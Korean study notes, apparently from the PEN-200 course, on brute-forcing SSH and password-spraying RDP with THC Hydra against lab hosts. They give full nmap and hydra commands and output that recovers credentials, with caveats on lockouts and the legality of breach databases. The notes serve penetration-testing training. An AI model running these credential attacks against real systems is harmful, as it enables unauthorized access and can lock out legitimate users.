# 16.1.1 SSH와 RDP

> **SSH and RDP** · PEN-200 §16.1.1

THC Hydra 로 SSH·RDP 에 딕셔너리 공격을 거는 절차. Hydra 와 `rockyou.txt`(1,400만여 개) 는 Kali 기본 탑재임.

**공격 전에 서비스부터 확인할 것.** 예제의 SSH 는 표준 22 가 아니라 **2222** 라, 포트를 틀리면 공격 자체가 성립하지 않음. `nmap -sV -p 2222` 로 `OpenSSH 8.2p1` 확인 후 진행함.

```
kali@kali:~$ sudo nmap -sV -p 2222 192.168.50.201
...
PORT   STATE SERVICE
2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
...
```
*공격 전 포트·서비스 확인 — 표준 22 가 아니라 2222 에 SSH 가 떠 있음*

`rockyou.txt` 는 압축 상태로 배포돼 **먼저 `gzip -d` 로 풀어야 함**. Hydra 인자 구성 — 단일 사용자 `-l`, 포트 `-s`, 패스워드 목록 `-P`, 타겟은 `ssh://IP` 형식임.

```
kali@kali:~$ cd /usr/share/wordlists/
kali@kali:~$ ls
dirb  dirbuster  fasttrack.txt  fern-wifi  metasploit  nmap.lst  rockyou.txt.gz  wfuzz
kali@kali:~$ sudo gzip -d rockyou.txt.gz
kali@kali:~$ hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222
ssh://192.168.50.201
...
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries
(l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.50.201:22/
[2222][ssh] host: 192.168.50.201   login: george   password: chocolate
1 of 1 target successfully completed, 1 valid password found
...
```

⚠️ 위 블록의 `hydra` 명령은 교재 PDF 자체의 조판으로 두 줄로 접혀 있음 — 실제로는 `ssh://192.168.50.201` 까지 한 줄임. 그대로 복사해 쓰면 실패함.

결과로 `george` / `chocolate` 를 얻음. **통한 이유가 둘 다 필요했음** — ① 패스워드가 워드리스트에 있었고 ② 공격할 사용자명을 이미 알고 있었음. 사용자명을 모르면 열거·정보수집으로 먼저 확보하거나, `root`(Linux)·`Administrator`(Windows) 같은 기본 계정을 노림. 계정명이 이름(`george`) 형식이라는 것 자체가 **조직의 계정 명명 규칙 단서**라 이후 열거에 재사용함.

**패스워드 스프레이(password spraying) — 방향을 뒤집는 기법.** 이미 확보한 평문 패스워드 하나를 다수의 사용자명에 시도함. 사용자명 목록은 `-L`, 단일 패스워드는 `-p` 로 줌.

```
kali@kali:~$ echo -e "daniel\njustin" | sudo tee -a
/usr/share/wordlists/dirb/others/names.txt
kali@kali:~$ hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#"
rdp://192.168.50.202
...
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries
(l:14344399/p:1), ~3586100 tries per task
[DATA] attacking rdp://192.168.50.202:3389/
...
[3389][rdp] host: 192.168.50.202   login: daniel   password: SuperS3cure1337#
[ERROR] freerdp: The connection failed to establish.
[3389][rdp] host: 192.168.50.202   login: justin   password: SuperS3cure1337#
[ERROR] freerdp: The connection failed to establish.
...
```

⚠️ 이 블록도 두 명령 모두 교재 PDF 자체의 조판으로 접혀 있음(`tee -a` 뒤 경로, `-p "..."` 뒤 `rdp://...` 가 같은 줄이어야 함).

**Hydra 는 목록에 «있는» 사용자명만 찾음** — `names.txt`(8천여 개)에 없던 `daniel`·`justin` 을 `tee -a` 로 먼저 추가해야 발견됨. 목록 전체를 돌리면 약 15분 걸리므로, 대상이 확실하면 두 줄짜리 목록으로 줄이는 편이 빠름.

평문 패스워드는 유출 DB(ScatteredSecrets 류)·설정 파일·이전 침투 결과에서 나올 수 있고, **사용자가 여러 시스템에 같은 값을 재사용**하므로 스프레이 가치가 큼. 단 유출 DB 서비스는 약관·합법성을 확인하고 **소유자 협조 아래에서만** 쓸 것 — WeLeakInfo 는 FBI·美 법무부에 압수된 전례가 있음.

**소음과 부작용이 이 기법의 진짜 위험임.** 딕셔너리 공격은 로그·이벤트·트래픽을 대량 생성함. 트래픽 자체보다 **방어 장비의 반응**이 더 곤란한데, 3회 실패로 계정을 잠그는 보호 기능이 있으면 **운영 중인 계정을 실제로 잠가버림**. 도구를 무작정 던지기 전에 열거로 이 위험부터 식별할 것.

시험 관점 — **인증 공격이 3분을 넘으면 접근이 틀린 것임.** 연습·챌린지 랩에서 그보다 오래 걸리면 명령·인자를 재확인하거나 다른 벡터로 전환할 것.
